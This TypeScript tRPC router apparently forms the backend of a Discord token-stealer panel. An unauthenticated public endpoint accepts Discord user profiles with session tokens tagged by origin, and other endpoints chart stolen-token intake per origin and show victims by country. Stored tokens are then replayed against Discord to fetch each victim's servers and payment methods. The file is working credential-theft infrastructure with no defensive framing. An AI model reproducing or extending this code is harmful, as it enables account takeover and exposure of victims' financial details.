import { z } from "zod";
import {
  createTRPCRouter,
  protectedProcedure,
  publicProcedure,
} from "~/server/api/trpc";
import { TRPCError } from "@trpc/server";
import { localeToCountry, TOKEN_REGEX_LEGACY } from "~/lib/utils";
import { fetchGuilds, fetchPaymentMethods } from "~/lib/dapi";

const zodUserShape = z.object({
  id: z.string().min(17),
  username: z.string(),
  discriminator: z.string(),
  avatar: z.string().nullish(),
  email: z.string().nullish(),
  verified: z.boolean().optional(),
  accent_color: z.number().nullish(),
  banner: z.string().nullish(),
  bot: z.boolean().optional(),
  flags: z.number().optional(),
  global_name: z.string().nullish(),
  locale: z.string().optional(),
  mfa_enabled: z.boolean().optional(),
  premium_type: z.number().optional(),
  public_flags: z.number().optional(),
  system: z.boolean().optional(),
  phone: z.string().nullish(),
  nsfw_allowed: z.boolean().nullish(),
  bio: z.string().nullish(),
  banner_color: z.string().nullish(),
});

export const accountRouter = createTRPCRouter({
  getWithCursor: protectedProcedure
    .input(
      z.object({
        search: z.string().optional(),
        nitroOnly: z.boolean().optional(),
        verifiedOnly: z.boolean().optional(),
        limit: z.number().min(1).max(100).nullish(),
        cursor: z.string().nullish(),
      }),
    )
    .query(async ({ ctx, input }) => {
      const limit = input.limit ?? 50;
      const cursor = input.cursor;
      const search = input.search;

      let searchQuery = {};
      if (search) {
        const [key, value] = search.split(":");
        if (key && value) {
          searchQuery = {
            [key]: {
              search: value,
            },
          };
        }
      }

      const items = await ctx.prisma.discordAccount.findMany({
        where: {
          ...searchQuery,
          premium_type: input.nitroOnly ? { gt: 0 } : undefined,
          verified: input.verifiedOnly ? input.verifiedOnly : undefined,
        },
        take: limit + 1,
        cursor: cursor ? { id: cursor } : undefined,
        orderBy: {
          id: "asc",
        },
      });
      let nextCursor: typeof cursor | undefined = undefined;
      if (items.length > limit) {
        const nextItem = items.pop();
        nextCursor = nextItem!.id;
      }

      return {
        items,
        nextCursor,
      };
    }),

  getStats: protectedProcedure.query(async ({ ctx }) => {
    // TODO: Simplify when prisma supports multiple counts in one query
    const [verified, unverified, nitro] = await ctx.prisma.$transaction([
      ctx.prisma.discordAccount.count({
        where: { verified: true },
      }),
      ctx.prisma.discordAccount.count({
        where: { verified: false },
      }),
      ctx.prisma.discordAccount.count({
        where: { verified: true, premium_type: { gt: 0 } },
      }),
    ]);

    return {
      verified,
      unverified,
      nitro,
    };
  }),
  getCountryDistribution: protectedProcedure.query(async ({ ctx }) => {
    const localeDistribution = await ctx.prisma.discordAccount.groupBy({
      by: ["locale"],
      _count: {
        locale: true,
      },
    });
    return localeDistribution.map((entry) => ({
      id: localeToCountry(entry.locale),
      value: entry._count.locale,
    }));
  }),
  getTokenRates: protectedProcedure.query(async ({ ctx }) => {
    // TODO: Simplify when prisma supports multiple counts in one query
    const MAX_DAYS = 7;
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const dates = Array.from({ length: MAX_DAYS + 1 }).map((_, i) => {
      const date = new Date(today);
      date.setDate(today.getDate() - i);
      date.setHours(0, 0, 0, 0);
      return date;
    });

    const resultMap = new Map<
      string,
      { id: string; data: { x: string; y: number }[] }
    >();

    for (const date of dates) {
      const count = await ctx.prisma.discordToken.groupBy({
        by: ["origin"],
        where: {
          createdAt: {
            lte: new Date(date.getTime() + 1000 * 60 * 60 * 24),
            gte: date,
          },
        },
        _count: {
          id: true,
        },
      });

      for (const entry of count) {
        entry.origin ??= "Unknown";
        const data = {
          x: date.toLocaleDateString("en-US").slice(0, -5),
          y: entry._count.id,
        };

        if (resultMap.has(entry.origin)) {
          resultMap.get(entry.origin)!.data.push(data);
          continue;
        }

        resultMap.set(entry.origin, {
          id: entry.origin,
          data: [data],
        });
      }
    }

    for (const [, origin] of resultMap) {
      for (const date of dates) {
        const dateString = date.toLocaleDateString("en-US").slice(0, -5);
        if (!origin.data.some((d) => d.x === dateString)) {
          const index = origin.data.findIndex((d) => new Date(d.x) > date);
          origin.data.splice(index === -1 ? origin.data.length : index, 0, {
            x: dateString,
            y: 0,
          });
        }
      }

      origin.data.sort(
        (a, b) => new Date(a.x).getTime() - new Date(b.x).getTime(),
      );
    }

    return [...resultMap.values()];
  }),
  createOrUpdate: publicProcedure
    .input(
      z.object({
        user: zodUserShape,
        tokens: z.array(z.string().regex(TOKEN_REGEX_LEGACY)),
        origin: z.string().optional(),
      }),
    )
    .mutation(async ({ input, ctx }) => {
      const { prisma } = ctx;
      const { user, tokens, origin } = input;

      await prisma.discordAccount.upsert({
        where: {
          id: user.id,
        },
        create: {
          ...input.user,
          tokens: {
            createMany: {
              data: tokens.map((token) => ({
                value: token,
                origin,
              })),
            },
          },
        },
        update: {
          ...input.user,
          tokens: {
            upsert: tokens.map((token) => ({
              where: {
                value: token,
              },
              create: {
                value: token,
                origin,
                lastCheckedAt: new Date(),
              },
              update: {
                lastCheckedAt: new Date(),
              },
            })),
          },
        },
      });
    }),
  getCachedByToken: publicProcedure
    .input(z.string().regex(TOKEN_REGEX_LEGACY))
    .query(async ({ input: token, ctx }) => {
      const response = await ctx.prisma.discordToken.findFirst({
        where: {
          AND: [
            {
              value: token,
            },
            {
              lastCheckedAt: {
                gte: new Date(Date.now() - 1000 * 60 * 60 * 3),
              },
            },
          ],
        },
        include: {
          discordAccount: true,
        },
      });

      return response?.discordAccount ?? null;
    }),
  getById: protectedProcedure
    .input(z.string().min(17))
    .query(async ({ input: id, ctx }) => {
      const account = await ctx.prisma.discordAccount.findUnique({
        where: {
          id,
        },
        include: {
          tokens: true,
        },
      });
      if (!account) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      return account;
    }),
  getAll: protectedProcedure.query(({ ctx }) => {
    return ctx.prisma.discordAccount.findMany();
  }),
  getGuildsById: protectedProcedure
    .input(z.string().min(17))
    .query(async ({ input: id, ctx }) => {
      const { prisma } = ctx;
      const token = await prisma.discordToken.findFirst({
        where: {
          discordAccountId: id,
        },
        orderBy: {
          lastCheckedAt: "desc",
        },
        select: {
          value: true,
        },
      });
      if (!token) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      const response = await fetchGuilds({
        method: "GET",
        token: token.value,
      });
      if (!response) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      const { data: guilds } = response;
      await prisma.discordGuild.createMany({
        data: guilds.map((guild) => ({
          ...guild,
          owner: undefined,
          permissions: undefined,
          owner_id: guild.owner ? id : undefined,
        })),
        skipDuplicates: true,
      });

      return guilds;
    }),
  getPaymentMethodsById: protectedProcedure
    .input(z.string().min(17))
    .query(async ({ input: id, ctx }) => {
      const { prisma } = ctx;
      const token = await prisma.discordToken.findFirst({
        where: {
          discordAccountId: id,
        },
        orderBy: {
          lastCheckedAt: "desc",
        },
        select: {
          value: true,
        },
      });
      if (!token) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      const response = await fetchPaymentMethods({
        method: "GET",
        token: token.value,
      });
      if (!response) {
        throw new TRPCError({ code: "NOT_FOUND" });
      }

      return response.data;
    }),
});
